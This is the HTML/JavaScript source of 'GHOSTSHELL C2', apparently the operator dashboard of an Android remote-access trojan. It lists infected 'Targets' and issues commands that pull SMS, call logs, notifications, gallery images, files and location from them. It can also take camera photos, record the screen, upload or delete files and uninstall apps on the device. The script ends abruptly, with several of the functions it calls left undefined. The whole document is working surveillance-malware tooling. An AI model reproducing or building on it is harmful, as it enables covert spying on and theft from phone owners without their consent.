<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOSTSHELL C2</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #050505; /* Deeper black */
            --panel-bg: #111; /* Slightly lighter for panels */
            --border-color: #00ff00; /* Vibrant lime green */
            --text-color: #e0e0e0; /* Light grey for readability */
            --glow-color: rgba(0, 255, 0, 0.6); /* Vibrant lime green glow */
            --accent-color: #ff0000; /* Bright red for accents */
            --button-hover-bg: linear-gradient(45deg, var(--border-color), var(--glow-color));
            --button-hover-text: var(--bg-color);
            --button-border-active: var(--accent-color);
        }
        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1400px; margin: auto; display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
        .header { grid-column: 1 / -1; text-align: center; margin-bottom: 10px; }
        .header h1 { color: var(--border-color); text-shadow: 0 0 15px var(--glow-color); font-size: 2.5rem; letter-spacing: 3px; }

        .device-list-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; height: 80vh; overflow-y: auto; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
        .device-list-panel h2 { border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; color: var(--accent-color); }
        .device-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; transition: all 0.3s ease; }
        .device-item:hover { background: rgba(0, 255, 0, 0.1); border-left: 3px solid var(--border-color); }
        .device-item.active { background: var(--border-color); color: var(--bg-color); font-weight: bold; box-shadow: 0 0 15px var(--glow-color); }
        .device-item small { display: block; font-size: 0.8em; opacity: 0.7; }

        .main-content { display: flex; flex-direction: column; }
        .status-bar { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
        .status-bar span { color: var(--border-color); }
        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; }
        .grid-btn {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            color: var(--border-color);
            padding: 15px;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.1);
        }
        .grid-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
            transition: 0.5s;
        }
        .grid-btn:hover::before {
            left: 100%;
        }
        .grid-btn:hover {
            background: var(--button-hover-bg);
            color: var(--button-hover-text);
            box-shadow: 0 0 20px var(--glow-color);
            border-color: var(--button-border-active);
        }
        .grid-btn:disabled { background: #111; color: #555; border-color: #444; cursor: not-allowed; box-shadow: none; }
        .grid-btn i { display: block; font-size: 1.8rem; margin-bottom: 10px; }

        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(5px); }
        .modal-content { background-color: var(--bg-color); margin: 5% auto; padding: 20px; border: 1px solid var(--border-color); width: 80%; max-width: 900px; height: 75vh; display: flex; flex-direction: column; box-shadow: 0 0 25px var(--glow-color); }
        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
        .modal-title { color: var(--accent-color); font-size: 1.8rem; text-shadow: 0 0 8px rgba(255, 0, 0, 0.5); }
        .modal-body { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9em; border: 1px dashed #333; padding: 10px; background-color: #0a0a0a; }
        .close { color: var(--border-color); float: right; font-size: 28px; font-weight: bold; cursor: pointer; transition: color 0.3s ease; }
        .close:hover { color: var(--accent-color); }

        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #222; }
        th { color: var(--border-color); background-color: rgba(0, 255, 0, 0.05); }
        tr:hover { background-color: rgba(0, 255, 0, 0.03); }
        .action-btn { background: none; border: 1px solid var(--accent-color); color: var(--accent-color); cursor: pointer; margin: 2px; padding: 3px 6px; transition: all 0.2s ease; }
        .action-btn:hover { background: var(--accent-color); color: var(--bg-color); box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }

        #gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; padding: 10px; }
        .gallery-item img { width: 100%; height: 100px; object-fit: cover; cursor: pointer; border: 1px solid var(--border-color); transition: transform 0.2s ease, box-shadow 0.2s ease; }
        .gallery-item img:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--glow-color); }
        .gallery-item p { font-size: 0.7rem; text-align: center; word-break: break-all; color: var(--text-color); }

        #popup-overlay { position: fixed; top: 20px; right: 20px; background-color: var(--accent-color); color: var(--bg-color); padding: 20px; border: 2px solid var(--border-color); z-index: 2000; display: none; box-shadow: 0 0 20px var(--glow-color); max-width: 350px; }

        /* Input and Button Styling in Modals */
        #modal-footer { display: flex; align-items: center; gap: 10px; padding-top: 10px; border-top: 1px solid #222; margin-top: 10px; }
        #modal-footer input[type="text"] {
            flex-grow: 1;
            padding: 8px;
            background-color: #0a0a0a;
            border: 1px solid var(--border-color);
            color: var(--text-color);
            font-family: 'Courier New', Courier, monospace;
            box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.2);
        }
        #modal-footer button {
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            color: var(--border-color);
            padding: 8px 15px;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.1);
        }
        #modal-footer button:hover {
            background: var(--button-hover-bg);
            color: var(--button-hover-text);
            box-shadow: 0 0 15px var(--glow-color);
            border-color: var(--button-border-active);
        }
        #modal-footer button i { margin-right: 5px; }

        .file-manager-path {
            background-color: #0a0a0a;
            border: 1px solid #333;
            padding: 5px;
            margin-bottom: 10px;
            color: var(--border-color);
        }
        .file-manager-path a {
            color: var(--accent-color);
            text-decoration: none;
        }
        .file-manager-path a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1><i class="fas fa-user-secret"></i> GHOSTSHELL C2</h1>
    </div>

    <div class="device-list-panel">
        <h2><i class="fas fa-satellite-dish"></i> Targets</h2>
        <div id="device-list">No devices connected.</div>
    </div>

    <div class="main-content">
        <div class="status-bar">
            <div>Target: <span id="device-info">None Selected</span></div>
            <div>Status: <span id="connection-status">-</span></div>
        </div>

        <div class="main-grid" id="main-grid-panel">
            <!-- Buttons will be dynamically enabled/disabled -->
        </div>
    </div>
</div>

<div id="main-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="modal-title" class="modal-title"></h2><span class="close" onclick="closeModal()">&times;</span></div><div id="modal-body" class="modal-body"></div><div id="modal-footer" style="padding-top: 10px;"></div></div></div>
<div id="popup-overlay"><h3><i class="fas fa-bell"></i> Alert</h3><p id="popup-content"></p></div>

<script>
let state = { devices: [], logs: [] };
let selectedClientId = null;
let currentModal = null;
let popupTimeout;
let flashOn = false;
let screenRecordOn = false;
let clientDataCache = {};
let notificationHashes = new Set();
let agentMessageHashes = new Set();

const mainGridPanel = document.getElementById('main-grid-panel');

// API Communication
async function sendCommand(cmd, body = {}) {
    if (!selectedClientId) {
        showPopup('error', 'No target selected.');
        return;
    }
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
        });
    } catch (e) { console.error('Error sending command:', e); }
}

// Core UI and State Management
function selectDevice(clientId) {
    if (selectedClientId === clientId) return;
    selectedClientId = clientId;
    flashOn = false; // Reset flash state on device switch
    screenRecordOn = false; // Reset screen record state
    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
    document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`).classList.add('active');
    updateMainDashboard();
    closeModal(); // Close any open modal when switching devices
}

function updateDeviceList() {
    const deviceList = document.getElementById('device-list');
    const connectedDevices = state.devices || []; // Ensure it's an array

    if (connectedDevices.length === 0) {
        deviceList.textContent = 'No devices connected.';
        selectedClientId = null; // Ensure selectedClientId is null if no devices
        document.querySelectorAll('.device-item.active').forEach(el => el.classList.remove('active')); // Clear any active class
    } else {
        deviceList.innerHTML = connectedDevices.map(dev => {
            const safeId = dev.id.replace(/[:.]/g, '-');
            return `
                <div class="device-item" id="device-${safeId}" onclick="selectDevice('${dev.id}')">
                    <strong>${dev.model}</strong>
                    <small>${dev.id} | ${dev.battery}</small>
                </div>
            `;
        }).join('');

        // Determine if selectedClientId is still valid or if a new one needs to be selected
        const previouslySelectedDeviceExists = connectedDevices.some(d => d.id === selectedClientId);

        if (!selectedClientId || !previouslySelectedDeviceExists) {
            // Select the first device if none is selected or the previously selected device is gone
            if (connectedDevices.length > 0) {
                selectDevice(connectedDevices[0].id); // Auto-select the first device
            } else {
                selectedClientId = null; // No devices to select
            }
        } else {
            // If the selected device still exists, just ensure its active class is set
            // First, remove active from all to avoid duplicates if previous selected changed position
            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
            const activeElement = document.getElementById(`device-${selectedClientId.replace(/[:.]/g, '-')}`);
            if (activeElement) {
                activeElement.classList.add('active');
            }
        }
    }
    updateMainDashboard();
}

function updateMainDashboard() {
    const devInfo = document.getElementById('device-info');
    const connStatus = document.getElementById('connection-status');

    const selectedDevice = state.devices.find(d => d.id === selectedClientId);

    if (selectedClientId && selectedDevice) { // Check if selectedDevice actually exists
        devInfo.textContent = selectedDevice.info_str;
        connStatus.textContent = 'ONLINE';
        connStatus.style.color = 'var(--border-color)';
        mainGridPanel.innerHTML = getGridButtonsHtml(true);
    } else {
        devInfo.textContent = 'None Selected';
        connStatus.textContent = 'OFFLINE';
        connStatus.style.color = 'red';
        mainGridPanel.innerHTML = getGridButtonsHtml(false);
        // selectedClientId is already null by updateDeviceList if no devices,
        // or if selected one disconnects.
    }
}

function getGridButtonsHtml(enabled) {
    const disabledAttr = enabled ? '' : 'disabled';
    return `
        <button class="grid-btn" ${disabledAttr} onclick="openModal('sms')"><i class="fas fa-sms"></i>SMS</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('calls')"><i class="fas fa-phone-alt"></i>Call Logs</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('filemanager')"><i class="fas fa-folder-open"></i>File Manager</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('gallery')"><i class="fas fa-images"></i>Gallery</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('notifications')"><i class="fas fa-bell"></i>Notifications</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('apps')"><i class="fas fa-th-large"></i>Apps</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')"><i class="fas fa-window-maximize"></i>Custom Toast</button>
        <button class="grid-btn" ${disabledAttr} onclick="openModal('openurl')"><i class="fas fa-external-link-alt"></i>Open URL</button>
        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('get_location')"><i class="fas fa-map-marker-alt"></i>Location</button>
        <button class="grid-btn" ${disabledAttr} id="flash-btn" onclick="toggleFlash()"><i class="fas fa-bolt"></i>Flash OFF</button>
        <button class="grid-btn" ${disabledAttr} id="screen-record-btn" onclick="toggleScreenRecord()"><i class="fas fa-video"></i>Record OFF</button>
        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('takebackpic')"><i class="fas fa-camera-retro"></i>Back Pic</button>
        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('takefrontpic')"><i class="fas fa-camera"></i>Front Pic</button>
    `;
}

// Modal & Dynamic Content
function openModal(modalType) {
    if (!selectedClientId) { showPopup('error', 'Select a target device first.'); return; }
    currentModal = modalType;
    document.getElementById('main-modal').style.display = 'block';
    document.getElementById('modal-title').textContent = modalType.charAt(0).toUpperCase() + modalType.slice(1);
    renderModalContent();
    fetchInitialDataForModal(modalType);
}

function closeModal() {
    if (currentModal === 'gallery') sendCommand('exit_gallery'); // Tell client to exit gallery mode
    if (currentModal === 'filemanager') sendCommand('exit_shell'); // Tell client to exit shell mode for file manager
    document.getElementById('main-modal').style.display = 'none';
    currentModal = null;
}

function fetchInitialDataForModal(modalType) {
    const commands = { sms: 'getsms', calls: 'getcalllogs', filemanager: 'filemanager', gallery: 'gallery', apps: 'list_app' };
    if (commands[modalType]) sendCommand(commands[modalType]);
}

async function renderModalContent() {
    const body = document.getElementById('modal-body');
    const footer = document.getElementById('modal-footer');
    body.innerHTML = 'Loading...';
    footer.innerHTML = '';

    if (!selectedClientId || !clientDataCache[selectedClientId]) { body.innerHTML = 'No data available. Client may have just connected.'; return; }
    const clientData = clientDataCache[selectedClientId];

    switch(currentModal) {
        case 'gallery':
            footer.innerHTML = `
                <button onclick="sendCommand('gallery back')"><i class="fas fa-arrow-left"></i> Back</button>
                <button onclick="sendCommand('gallery')"><i class="fas fa-sync-alt"></i> Refresh</button>
                <span style="margin: 0 15px;">Page: ${clientData.gallery?.page || 0}</span>
                <button onclick="sendCommand('gallery next')">Next <i class="fas fa-arrow-right"></i></button>`;
            body.innerHTML = '<div id="gallery-grid">' + (clientData.gallery?.files || []).map(file => `
                <div class="gallery-item">
                    <img src="data:image/jpeg;base64,${file.thumbnail}" alt="${file.name}"/>
                    <p>${file.name}</p>
                </div>`).join('') + '</div>';
            break;
         case 'toast':
             document.getElementById('modal-title').textContent = 'Display Custom Toast';
             body.innerHTML = '<p>Enter text to display on the target screen. The app will request permission if needed.</p>';
             footer.innerHTML = `<input type="text" id="toast-text" placeholder="Your text here..." style="flex-grow: 1;"><button onclick="sendToast()">Show Toast</button><button onclick="sendCommand('toast off')">Hide Toast</button>`;
             break;
         case 'openurl':
             document.getElementById('modal-title').textContent = 'Open URL';
             body.innerHTML = '<p>Enter the full URL to open on the target device.</p>';
             footer.innerHTML = `<input type="text" id="url-text" placeholder="https://example.com" style="flex-grow: 1;"><button onclick="sendOpenUrl()">Open URL</button>`;
             break;
        case 'sms':
            body.innerHTML = '<table><thead><tr><th>Sender</th><th>Message</th></tr></thead><tbody>' + (clientData.sms_logs || []).map(log => `<tr><td>${log.userSender}</td><td>${log.content}</td></tr>`).join('') + '</tbody></table>';
            break;
        case 'calls':
            body.innerHTML = '<table><thead><tr><th>Number</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody>' + (clientData.call_logs || []).map(log => `<tr><td>${log.number}</td><td>${log.date}</td><td>${log.duration_seconds}s</td><td>${log.call_type}</td></tr>`).join('') + '</tbody></table>';
            break;
        case 'filemanager':
             footer.innerHTML = `<button onclick="document.getElementById('file-upload-input').click()"><i class="fas fa-upload"></i> Upload</button><input type="file" id="file-upload-input" style="display:none;"><input type="text" id="fm-input" placeholder="File/Folder Name or New Name for Rename" style="width: 50%;"><button onclick="handleFmAction('rename')"><i class="fas fa-i-cursor"></i> Rename</button><button onclick="handleFmAction('delete')"><i class="fas fa-trash-alt"></i> Delete</button><button onclick="handleFmAction('mkdir')"><i class="fas fa-folder-plus"></i> Mkdir</button>`;
            const fmData = clientData.file_manager;
            let filesHtml = `<div class="file-manager-path">Current Path: <span id="current-fm-path">${fmData.path || '/'}</span></div><table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody><tr><td colspan="3"><a href="#" onclick="sendCommand('cd ..')"><i class="fas fa-level-up-alt"></i> .. (Up)</a></td></tr>`;
            filesHtml += (fmData.files || []).map(file => {
                const name = file.name;
                const icon = file.isDirectory ? 'fas fa-folder' : 'fas fa-file';
                const actionLink = file.isDirectory ? `<a href="#" onclick="sendCommand('cd ${name}')"><i class="${icon}"></i> ${name}</a>` : `<i class="${icon}"></i> ${name}`;
                return `<tr><td>${actionLink}</td><td>${file.isDirectory ? 'Folder' : 'File'}</td><td><button class="action-btn" onclick="sendCommand('get ${name}')"><i class="fas fa-download"></i> Download</button><button class="action-btn" onclick="handleFmAction('delete', '${name}')"><i class="fas fa-trash-alt"></i> Delete</button></td></tr>`;
            }).join('');
            body.innerHTML = filesHtml + '</tbody></table>';
            document.getElementById('file-upload-input').onchange = (e) => { if (e.target.files.length) uploadFile(e.target.files[0], fmData.path); };
            break;
         case 'notifications':
            body.innerHTML = '<table><thead><tr><th>App</th><th>Title</th><th>Text</th></tr></thead><tbody>' + (clientData.notifications || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}</td><td>${n.text}</td></tr>`).join('') + '</tbody></table>';
            break;
        case 'apps':
            body.innerHTML = '<table><thead><tr><th>App Name</th><th>Package Name</th><th>Actions</th></tr></thead><tbody>' + (clientData.apps || []).map(app => `<tr><td>${app.appName}</td><td>${app.packageName}</td><td><button class="action-btn" onclick="sendCommand('run ${app.packageName}')">Run</button><button class="action-btn" onclick="uninstallApp('${app.packageName}')">Uninstall</button></td></tr>`).join('') + '</tbody></table>';
            break;
    }
}

// Actions
function sendToast() { const text = document.getElementById('toast-text').value; if (text) sendCommand(`toast on ${text}`); }
function sendOpenUrl() { const url = document.getElementById('url-text').value; if (url) sendCommand(`openurl ${url}`); }
function handleFmAction(action, fileName = null) {
    const fmInput = document.getElementById('fm-input').value;
    if (action === 'rename') {
        const oldName = fileName || prompt('Enter current file/folder name to rename:');
        if (oldName && fmInput) sendCommand(`rename ${oldName} ${fmInput}`);
        else if (!oldName) showPopup('error', 'No file/folder name provided for rename.');
        else if (!fmInput) showPopup('error', 'No new name provided for rename.');
    } else if (action === 'delete') {
        const nameToDelete = fileName || fmInput;
        if (nameToDelete && confirm(`Delete ${nameToDelete}?`)) sendCommand(`del ${nameToDelete}`);
        else if (!nameToDelete) showPopup('error', 'No file/folder name provided for delete.');
    } else if (action === 'mkdir') {
        if (fmInput) sendCommand(`mkdir ${fmInput}`);
        else showPopup('error', 'No directory name provided for mkdir.');
    }
}
function uploadFile(file, currentPath) {
    const reader = new FileReader();
    reader.onload = function(event) {
        const base64Content = btoa(event.target.result); // btoa for binary safe base64
        sendCommand('upload', { filename: btoa(file.name), data: base64Content });
    };
    reader.readAsBinaryString(file);
}
